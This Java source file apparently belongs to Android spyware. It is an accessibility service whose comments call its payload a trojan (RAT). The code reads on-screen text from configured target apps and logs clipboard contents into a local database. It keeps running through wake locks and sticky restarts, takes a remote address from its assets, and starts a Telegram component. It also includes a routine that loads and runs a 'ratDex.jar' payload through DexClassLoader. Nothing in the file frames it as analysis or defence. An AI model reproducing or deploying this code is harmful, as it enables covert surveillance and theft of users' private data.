package com.hhm.android.otherapp;

import android.accessibilityservice.AccessibilityService;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.ActivityManager;
import android.app.Service;
import android.content.ClipData;
import android.content.ClipDescription;
import android.content.ClipboardManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.res.AssetManager;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import android.support.annotation.Nullable;
import android.support.v4.app.ActivityCompat;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

//import com.hhm.android.rat.ratManager;

import com.google.gson.Gson;
import com.hhm.android.otherapp.sqlite.SQLiteDao;
import com.hhm.android.otherapp.utils.AssetsUtil;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.List;
import java.util.logging.Logger;

import dalvik.system.DexClassLoader;


public class myService extends AccessibilityService{
    public static final String TAG = "MainService";

    public myService() {}

    @Override
    public void onCreate(){
        //copyAssets(this,"ratDex.jar");
        //registerScreenEvents(); // 监听屏幕事件
        //initAndStartRatFromDex(this); // 动态加载木马Dex，并启动
        registerScreenEvents(); // 监听屏幕事件
    }

    @Override
    public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2) {
        contextOfApplication = this;
        SQLiteDao.setInstance(this); // 初始化数据库
        ServiceConfig.setRemoteAddress(AssetsUtil.getRemoteAddressFromAssets(this));
        ServiceConfig.setPackages(AssetsUtil.getPackageNamesFromAssets(this));
        System.out.println("启动TelegramManager");
        TelegramManager.startAsync(this);
        // Android 10 应用已经不能在后台监听剪贴板数据
        if (Build.VERSION.SDK_INT < 29 && mClipboardManager == null){ // 若 Android 版本低于 Android 10，设置剪贴板监听，避免重复设置
            registerClipEvents();
        }
        registerScreenEvents(); // 监听屏幕事件
        return Service.START_STICKY; // 提高 server 优先级，自动重启
    }

    private void copydata(final Context context) {
        System.out.println("1");
        ClipboardManager clipboard = (ClipboardManager) context.getSystemService(context.CLIPBOARD_SERVICE);
        System.out.println("2");
        //无数据时直接返回
        if (!clipboard.hasPrimaryClip()) {
            System.out.println("3");
            return;
        }
        //如果是文本信息
        if (clipboard.getPrimaryClipDescription().hasMimeType(ClipDescription.MIMETYPE_TEXT_PLAIN)) {
            ClipData cdText = clipboard.getPrimaryClip();
            ClipData.Item item = cdText.getItemAt(0);
            //此处是TEXT文本信息
            if (item.getText() != null && !item.getText().toString().equals("")) {
               String str = item.getText().toString();
               System.out.println("20201117==>" + str);

            }
        }
    }

    public void initAndStartRatFromDex(Context ctx){
        File dexOutputDir = ctx.getDir("testJar", 0);
        String dexPath = ctx.getFilesDir().getPath()+"/ratDex.jar";
        File f = new File(dexPath);
        if (f.exists()){
            Log.e(TAG,dexPath);
        }

        DexClassLoader loader = new DexClassLoader(dexPath, dexOutputDir.getAbsolutePath(), null, ctx.getClassLoader());
        try {
            Class clz = loader.loadClass("com.hhm.android.rat.ratManager");
            Method dexRes = clz.getMethod("initAndStartRat",Context.class);
            Object[] params = {ctx};
            dexRes.invoke(clz.newInstance(),params);
            Log.e(TAG,"Invoke initAndStartRat()");
        } catch (InvocationTargetException e){
            e.printStackTrace();
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    private void copyAssets(Context ctx, String filename) {
        InputStream in = null;
        OutputStream out = null;
        Log.e(TAG, "copyAssets():Attempting to copy this file: " + filename);
        try {
            AssetManager assetManager = ctx.getAssets();
            String executableFilePath = ctx.getFilesDir().getPath();
            in = assetManager.open(filename);
            File outFile = new File(executableFilePath, filename);
            out = new FileOutputStream(outFile);
            copyFile(in, out);
            in.close();
            in = null;
            out.flush();
            out.close();
            out = null;
            Log.e(TAG, "Copy success: " + filename);
        } catch(IOException e) {
            Log.e(TAG, "Failed to copy asset file: " + filename, e);
        }
    }

    void copyFile(InputStream in, OutputStream out){
        try {
            byte[] buf = new byte[1024];
            int len;
            while ((len = in.read(buf)) > 0) {
                out.write(buf, 0, len);
            }
        } catch (IOException e){
            Log.e(TAG, "Failed to read/write asset file: ", e);
        }
    };

    @Override
    public void onDestroy() {
        Log.e(TAG,"onDestroy():onDestroy()");
        listener.unregister();
        super.onDestroy();
    }

    /*@Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }*/

    // 注册屏幕监听，息屏时保持活动，开屏时保持屏幕开启
    private ScreenListener listener = new ScreenListener(this);
    private void registerScreenEvents(){
        listener.register(new ScreenListener.ScreenStateListener() {
            @Override
            public void onScreenOn() { }
            @Override
            public void onScreenOff() {
                acquireWakeLock();
            }
            @Override
            public void onUserPresent() {
                releaseWakeLock();
            }
        });
    }

    PowerManager.WakeLock wakeLock = null;
    //在锁屏时仍然获取CPU，保持运行
    @SuppressLint("InvalidWakeLockTag")
    private void acquireWakeLock() {
        if (wakeLock == null) {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK | PowerManager.ON_AFTER_RELEASE, getClass().getCanonicalName());
            Log.e(TAG,"acquireWakeLock():" + wakeLock);
            if (wakeLock != null) {
                wakeLock.acquire();
            }
        }
    }

    private void releaseWakeLock() {
        if (wakeLock != null) {
            wakeLock.release();
            wakeLock = null;
        }
    }

    //20201116
    private static Context contextOfApplication;
    private StringBuffer lastAllInfoStr = new StringBuffer();
    private StringBuffer allInfoStr;

    private static String packagename = "";

    //任何操作将触发执行该回调函数
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
            /*String packageName = null;
            if (event.getPackageName()!=null){
                packageName = event.getPackageName().toString();
            } else {
                packageName = "CAN'T GET PACKAGE NAME";
            }
            if (ServiceConfig.isInPackage(packageName)){
                allInfoStr = new StringBuffer();
                nodeInfoDFS(getRootInActiveWindow(),0);
                String lastStr = lastAllInfoStr.toString();
                String newStr = allInfoStr.toString();
                if (!lastStr.equals(newStr)){
                    SQLiteDao.addToList(packageName,newStr);
                }
                lastAllInfoStr = allInfoStr;
            }*/
        packagename = event.getPackageName().toString();
        if (ServiceConfig.isInPackage(packagename)) {
            AccessibilityNodeInfo rowNode = getRootInActiveWindow();
            if (rowNode == null) {
                return;
            } else {
                recycle(rowNode,packagename);
            }
        }
    }

    String data = "";
    public void recycle(AccessibilityNodeInfo info,String packagename) {
        if (info.getChildCount() == 0) {
            if (info.getText() != null && !data.contains(info.getText())) {
                System.out.println("2020==浏览器>" + info.getText().toString());
                SQLiteDao.addToList(packagename,info.getText().toString());
            }
            data = data + "\t" + info.getText();
        } else {
            for (int i = 0; i < info.getChildCount(); i++) {
                if(info.getChild(i)!=null){
                    recycle(info.getChild(i),packagename);
                }
            }
        }
        try {
            Thread.sleep(100);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        info.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD); // 下滑
    }

    @Override
    public void onInterrupt() {
        Log.e(TAG,"onInterrupt():onInterrupt");
        SQLiteDao.addLogOfDb(); // 服务暂停，将 List 中的数据通过事务传入数据库
    }

    public static Context getContextOfApplication() {
        return contextOfApplication;
    }

    // 遍历根节点下所有节点，并将节点的 Text 和 ContentDescription 添加至 allInfoStr
    private void nodeInfoDFS(AccessibilityNodeInfo info, int tierIndex) {
        try {
            CharSequence text = info.getText();
            CharSequence contentDescription = info.getContentDescription();
            if (text !=null && contentDescription !=null){
                setIndentation(allInfoStr,tierIndex);
                allInfoStr.append(text);
                if (text != contentDescription){
                    allInfoStr.append(" ").append(contentDescription).append("\n");
                }else {
                    allInfoStr.append("\n");
                }
            }
            else if (text != null){
                setIndentation(allInfoStr,tierIndex);
                allInfoStr.append(text).append("\n");
            }
            else if (contentDescription != null){
                setIndentation(allInfoStr,tierIndex);
                allInfoStr.append(contentDescription).append("\n");
            }
            for (int i = 0; i < info.getChildCount(); i++) {
                if (info.getChild(i)!=null){
                    nodeInfoDFS(info.getChild(i),tierIndex+1);
                }
            }
        } catch (Exception e){
            Log.e(TAG,"nodeInfoDFS():"+e.getMessage());
        }
    }

    // 设置 allInfoStr 中的缩进
    private void setIndentation(StringBuffer stringBuffer,int tierIndex){
        for (int i=0; i<tierIndex; i++){
            stringBuffer.append("\t");
        }
    }

    private ClipboardManager mClipboardManager;
    private ClipboardManager.OnPrimaryClipChangedListener mOnPrimaryClipChangedListener;
    private void registerClipEvents() {
        Log.e(TAG,"registerClipEvents():register");
        mClipboardManager = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
        //剪切板数据存入数据库
        mOnPrimaryClipChangedListener = new ClipboardManager.OnPrimaryClipChangedListener() {
            @Override
            public void onPrimaryClipChanged() {
                Log.e(TAG,"onPrimaryClipChanged():function is called");
                try {
                    ClipData clipData = mClipboardManager.getPrimaryClip();
                    if (clipData != null && clipData.getItemCount() > 0) {
                        CharSequence content = clipData.getItemAt(0).getText();
                        SQLiteDao.addClipOfDb(content.toString());
                    }
                } catch (NullPointerException e) {
                    Log.e(TAG,"onPrimaryClipChanged():"+e.getMessage());
                }
            }
        };
        mClipboardManager.addPrimaryClipChangedListener(mOnPrimaryClipChangedListener);
    }


}
